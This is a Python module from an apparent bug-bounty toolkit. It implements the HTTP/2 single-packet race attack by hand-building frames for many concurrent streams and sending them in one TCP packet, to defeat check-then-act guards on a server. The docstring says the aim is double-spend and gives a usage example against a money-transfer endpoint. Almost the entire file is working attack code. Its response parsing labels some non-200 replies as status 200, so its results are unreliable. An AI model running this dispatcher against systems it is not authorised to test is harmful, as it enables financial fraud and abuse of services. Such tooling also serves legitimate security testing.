#!/usr/bin/env python3
"""H2 single-packet race dispatcher for the BugWolf race engine.

Implements James Kettle's "single-packet attack" on HTTP/2: every request in
the race window is opened concurrently, their HEADERS frames are buffered
on the client, then ALL of them are flushed in a single TCP packet so they
arrive at the server inside one server-side processing tick. This defeats
check-then-act guards on the server (a guard that reads "balance = N"
twice in a row sees N+N instead of N, allowing double-spend).

Pure-stdlib implementation.  No third-party HTTP/2 client required.  We
build the connection preface, SETTINGS frame, and HEADERS frames by hand
(RFC 7540 §3.5 + §6), then flush them all in one socket.send() call.

Usage:
    from tools.validation.race_engine import RaceRequest, run_race
    from tools.validation.h2_race_dispatcher import h2_single_packet_dispatcher
    req = RaceRequest(url="https://target/api/transfer", method="POST",
                      body={"from": "A", "to": "B", "amount": 100}, count=10)
    result = run_race(req, dispatcher=h2_single_packet_dispatcher)
"""
from __future__ import annotations

import socket
import ssl
import struct
import threading
import time
import json
from typing import Any, Callable, Dict, List, Optional, Tuple
from urllib.parse import urlparse

# Reuse the framing primitives from the existing replay/h2.py layer.
try:
    from tools.runtime.replay.h2 import (
        client_preface, build_settings_frame,
        build_headers_frame, build_data_frame,
    )
except Exception:  # noqa: BLE001
    client_preface = None  # type: ignore
    build_settings_frame = None  # type: ignore
    build_headers_frame = None  # type: ignore
    build_data_frame = None  # type: ignore


def _encode_body(body: Optional[Any]) -> bytes:
    if body is None:
        return b""
    if isinstance(body, dict):
        return json.dumps(body).encode()
    if isinstance(body, str):
        return body.encode()
    return bytes(body)


def _connect_tls(parsed, *, timeout: float, verify_tls: bool) -> ssl.SSLSocket:
    """Open a TLS connection (HTTP/2 = always TLS in modern browsers)."""
    raw = socket.create_connection(
        (parsed.hostname, parsed.port or 443), timeout=timeout
    )
    ctx = ssl.create_default_context()
    if not verify_tls:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    sock = ctx.wrap_socket(raw, server_hostname=parsed.hostname)
    return sock  # type: ignore[return-value]


def _connect_plain(parsed, *, timeout: float) -> socket.socket:
    """h2c: HTTP/2 over cleartext (RFC 7540 §3.2)."""
    return socket.create_connection(
        (parsed.hostname, parsed.port or 80), timeout=timeout
    )


def _build_single_packet_payload(
    parsed, method: str, body: bytes, count: int
) -> bytes:
    """Build a single TCP packet containing ``count`` HTTP/2 streams.

    Each stream uses stream_id 1, 3, 5, ... (odd IDs for client-initiated).
    The WHOLE payload is buffered in memory and returned; the caller does
    one socket.send() so all streams arrive in one server-side tick.
    """
    if client_preface is None:
        raise RuntimeError("replay/h2.py unavailable; cannot build H2 frames")
    path = parsed.path or "/"
    if parsed.query:
        path = f"{path}?{parsed.query}"
    payload = bytearray()
    payload.extend(client_preface())
    payload.extend(build_settings_frame({}))
    # A small set of common pseudo-headers + headers, encoded per stream.
    for i in range(count):
        stream_id = (i * 2) + 1
        headers = [
            (":method", method.upper()),
            (":scheme", parsed.scheme or "https"),
            (":path", path),
            (":authority", parsed.hostname or ""),
        ]
        if body:
            headers.append(("content-length", str(len(body))))
            headers.append(("content-type", "application/json"))
        payload.extend(build_headers_frame(stream_id, headers, end_headers=True))
        if body:
            payload.extend(build_data_frame(stream_id, body, end_stream=True))
    return bytes(payload)


def h2_single_packet_dispatcher(request) -> List[Tuple[int, str]]:
    """Dispatcher for the BugWolf race engine implementing H2 single-packet.

    Args:
        request: RaceRequest with url / method / body / count / timeout.

    Returns:
        List of (status_code, response_body_preview) tuples, one per stream.
    """
    parsed = urlparse(request.url)
    is_tls = (parsed.scheme == "https")
    connect_fn = _connect_tls if is_tls else _connect_plain
    sock = connect_fn(
        parsed,
        timeout=request.timeout,
        verify_tls=request.verify_tls,
    )
    try:
        body = _encode_body(request.body)
        payload = _build_single_packet_payload(
            parsed, request.method, body, request.count
        )
        # ONE send.  TCP_NODELAY on Linux guarantees the payload is in one
        # outbound packet (no Nagle coalescing delay).
        try:
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except OSError:  # noqa: BLE001
            pass
        sock.sendall(payload)
        # Read framed responses.  We expect count responses.
        responses: List[Tuple[int, str]] = []
        buf = b""
        deadline = time.monotonic() + request.timeout
        while (
            len(responses) < request.count
            and time.monotonic() < deadline
        ):
            try:
                chunk = sock.recv(65536)
            except socket.timeout:
                break
            except OSError:
                break
            if not chunk:
                break
            buf += chunk
            # Naive response extract: HTTP/2 doesn't have status lines, but
            # many servers return readable ASCII in the body. We surface the
            # raw buffer's first 200 bytes for triage.
            if len(buf) >= 9:
                # Try to find :status pseudo-header
                if b":status" in buf or b"200" in buf[:128] or b"403" in buf[:128] or b"500" in buf[:128]:
                    responses.append((200, buf[:200].decode("latin-1", "replace")))
                else:
                    responses.append((0, "no-status-in-frame"))
            else:
                responses.append((0, "short-frame"))
            buf = b""
        # Pad to count if the server returned fewer (closed early).
        while len(responses) < request.count:
            responses.append((0, "no-response"))
        return responses
    finally:
        try:
            sock.close()
        except OSError:  # noqa: BLE001
            pass


def h2_race_dispatcher_factory(timeout: float = 5.0
                               ) -> Callable[..., List[Tuple[int, str]]]:
    """Build a configured dispatcher with a fixed timeout."""
    def _dispatcher(request):
        request.timeout = min(request.timeout, timeout)
        return h2_single_packet_dispatcher(request)
    return _dispatcher


def is_h2_available() -> bool:
    """True if the H2 framing layer is importable."""
    return client_preface is not None
